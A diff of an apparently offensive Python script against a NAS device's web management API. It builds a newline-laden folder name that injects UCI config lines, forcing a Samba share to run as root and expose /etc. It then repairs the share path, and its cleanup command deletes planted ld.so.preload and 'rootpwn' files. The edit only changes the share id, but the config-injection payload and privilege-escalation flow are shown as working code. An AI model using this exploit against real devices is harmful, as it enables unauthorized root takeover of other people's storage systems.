@@ -382,8 +382,8 @@ def _disarm_command(uid, weird_name):
     注入的 samba 共享与系统用户。注意 authorized_keys 有意保留（SSH 认证通道）。"""
     return ("rm -f /etc/ld.so.preload /etc/pwn.so /etc/.rootpwn.sh /etc/.rootpwn.log; "
             "rm -rf '/home/u%s/pool0/data/%s'; "
-            "uci delete sambashare.u%s_2; uci commit sambashare; "
-            "uci delete sambauser.u%s_2 2>/dev/null; uci commit sambauser; "
+            "uci delete sambashare.u%s_1; uci commit sambashare; "
+            "uci delete sambauser.u%s_1 2>/dev/null; uci commit sambauser; "
             "sed -i '/sambau%s/d' /etc/passwd /etc/shadow 2>/dev/null; "
             "nas call smb_mgr.sh restart 2>/dev/null || systemctl restart smb nmb 2>/dev/null; "
             "echo CLEAN_OK"
@@ -548,10 +548,10 @@ def main():
     M30 = "M" * 30
     weird_name = (
         M30 + NL + Q + NL +
-        "set sambashare.u%s_2.user_force=root" % nas.uid + NL +
-        "set sambashare.u%s_2.create_mask=0644" % nas.uid + NL +
-        "set sambashare.u%s_2.path=etc" % nas.uid + NL +
-        "set sambashare.u%s_2.comment=" % nas.uid
+        "set sambashare.u%s_1.user_force=root" % nas.uid + NL +
+        "set sambashare.u%s_1.create_mask=0644" % nas.uid + NL +
+        "set sambashare.u%s_1.path=etc" % nas.uid + NL +
+        "set sambashare.u%s_1.comment=" % nas.uid
     )
     enc = urllib.parse.quote(weird_name, safe="")
     # /pool0 为单池默认布局（get_pool_info 的 data_dir 即 /pool0/data）；多池设备需按实际调整
@@ -569,10 +569,10 @@ def main():
                                 {"username": "u" + nas.uid, "password": smb_password,
                                  "share_dir": [weird_real]}, timeout=60))
     # add 失败不区分原因直接试 set（A4：原实现把解析失败当成功再叠加误判）；
-    # id=2 是 smb_get_id 的固定结果（用户首个共享为 1，第二个为 2），非硬编码魔法数
+    # 空账号首次建共享落在 id=1 / u{uid}_1（RP05 重置后实测）；已有共享的设备可能仍是 id=2
     if j.get("code") not in (0, None):
         j = nas.json_body(nas.https("/cgi-bin/luci/netshare/set_samba_account",
-                                    {"id": "2", "username": "u" + nas.uid, "password": smb_password,
+                                    {"id": "1", "username": "u" + nas.uid, "password": smb_password,
                                      "share_dir": [weird_real]}, timeout=90))
     code = j.get("code")
     log("info" if code in (0, None) else "warn", "add_samba_account code=%s (2502 restart-fail 可继续)" % code)
@@ -581,7 +581,7 @@ def main():
 
     # repair: point share to clean /etc path via set (keeps user_force=root)
     j = nas.json_body(nas.https("/cgi-bin/luci/netshare/set_samba_account",
-                                {"id": "2", "username": "u" + nas.uid, "password": smb_password,
+                                {"id": "1", "username": "u" + nas.uid, "password": smb_password,
                                  "share_dir": ["/etc"]}, timeout=120))
     if j.get("code") not in (0, None) or " 20" not in j.get("http_status", ""):
         die("share repair failed: %s" % j)
